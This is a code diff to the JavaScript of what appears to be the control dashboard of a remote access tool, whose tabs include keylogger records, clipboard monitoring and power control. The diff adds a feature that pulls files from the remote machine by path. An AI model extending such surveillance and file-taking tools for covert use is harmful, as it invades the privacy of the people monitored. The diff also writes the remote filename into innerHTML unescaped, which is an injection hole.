@@ -219,7 +219,8 @@ function switchTab(tabId, element) {
         'keylogger': 'Keylogger Records', 
         'power': 'Power Control',
         'clipboard': 'Clipboard Monitor',
-        'tts': 'Text to Speech'
+        'tts': 'Text to Speech',
+        'files': 'File Downloader'
     };
     const titleEl = document.getElementById('page-title');
     if(titleEl) titleEl.innerText = titles[tabId] || 'Dashboard';
@@ -386,6 +387,38 @@ function stopDashboardUpdates() {
 /* --- MESSAGE HANDLER --- */
 function handleIncomingMessage(data) {
     if (data.trim() === "pong") { return; }
+
+    if (data.startsWith("FILE_DOWNLOAD|")) {
+        // Cấu trúc: FILE_DOWNLOAD | Tên File | Base64
+        const parts = data.split("|");
+
+        // Kiểm tra xem có đủ 3 phần không
+        if (parts.length >= 3) {
+            // parts[0] là "FILE_DOWNLOAD"
+            // parts[1] là Tên File (vd: "Báo Cáo (1).pdf") -> Lấy nguyên văn
+            const filename = parts[1];
+            
+            // parts[2] là Base64. 
+            
+            // Tìm vị trí dấu | thứ nhất và thứ hai
+            const firstPipe = data.indexOf("|");
+            const secondPipe = data.indexOf("|", firstPipe + 1);
+            
+            if (secondPipe !== -1) {
+                const finalFilename = data.substring(firstPipe + 1, secondPipe);
+                const base64Content = data.substring(secondPipe + 1);
+
+                // Gọi hàm lưu
+                const isSaved = saveBase64ToDisk(finalFilename, base64Content);
+                
+                if (isSaved) {
+                    addActivityLog("Downloaded: " + finalFilename);
+                    showToast("File Downloaded Successfully");
+                }
+            }
+        }
+        return; 
+    }
 
     if (data.startsWith("sys-info ")) {
         const parts = data.substring(9).split("|");
@@ -919,7 +952,6 @@ function renderProcessTable(d, id) {
             const threads = c[2];
             const name = c[3];
 
-            // LOGIC MỚI: Xử lý hiển thị RAM
             // Nếu RAM <= 0 (Process hệ thống/bảo mật), hiện "N/A" màu xám
             let ramDisplay;
             if (ramRaw <= 0) {
@@ -954,4 +986,79 @@ function requestScreenshot() { sendCmd("screenshot"); }
 function confirmPower(action) {
     const msg = action === 'shutdown' ? "Are you sure you want to SHUTDOWN the remote computer?" : "Are you sure you want to RESTART the remote computer?";
     if(confirm(msg)) sendCmd(action);
+}
+
+/* --- FILE TRANSFER FUNCTIONS --- */
+
+function requestDownloadFile() {
+    const path = document.getElementById("filePathInput").value.trim();
+    if (!path) {
+        showToast("Please enter remote file path", "error");
+        return;
+    }
+    sendCmd("download-file " + path);
+    
+    addActivityLog("Requesting file: " + path);
+    const btn = document.querySelector("#tab-files button");
+    if(btn) {
+        const originalText = btn.innerHTML;
+        btn.innerHTML = `<i data-lucide="loader" class="spinning"></i> Downloading...`;
+        btn.disabled = true;
+        setTimeout(() => {
+            btn.innerHTML = originalText;
+            btn.disabled = false;
+            if(typeof lucide !== 'undefined') lucide.createIcons();
+        }, 2000);
+    }
+}
+
+function saveBase64ToDisk(filename, base64) {
+    try {
+        // [QUAN TRỌNG] Lọc bỏ các ký tự lạ (như \0, \n) làm hỏng Base64
+        // Chỉ giữ lại các ký tự Base64 chuẩn (A-Z, a-z, 0-9, +, /, =)
+        const cleanBase64 = base64.replace(/[^A-Za-z0-9+/=]/g, "");
+
+        const binaryString = atob(cleanBase64);
+        const len = binaryString.length;
+        const bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binaryString.charCodeAt(i);
+        }
+
+        const blob = new Blob([bytes], { type: "application/octet-stream" });
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = filename;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        // Cập nhật giao diện danh sách
+        const list = document.getElementById("file-download-list");
+        if (list) {
+            if (list.querySelector(".scan-placeholder")) list.innerHTML = "";
+
+            const item = document.createElement("div");
+            item.className = "file-item";
+            item.innerHTML = `
+                <div class="file-info">
+                    <div class="file-icon-box"><i data-lucide="file-check"></i></div>
+                    <div>
+                        <div class="file-name">${filename}</div>
+                        <div class="file-path">${(bytes.length / 1024).toFixed(1)} KB • ${new Date().toLocaleTimeString()}</div>
+                    </div>
+                </div>
+                <div class="badge-success">Saved</div>
+            `;
+            list.prepend(item);
+            if(typeof lucide !== 'undefined') lucide.createIcons();
+        }
+        
+        return true; // Trả về true để báo thành công
+
+    } catch (e) {
+        console.error("File Save Error:", e);
+        showToast("Error saving file (Invalid Base64)", "error");
+        return false; // Trả về false để báo thất bại
+    }
 }
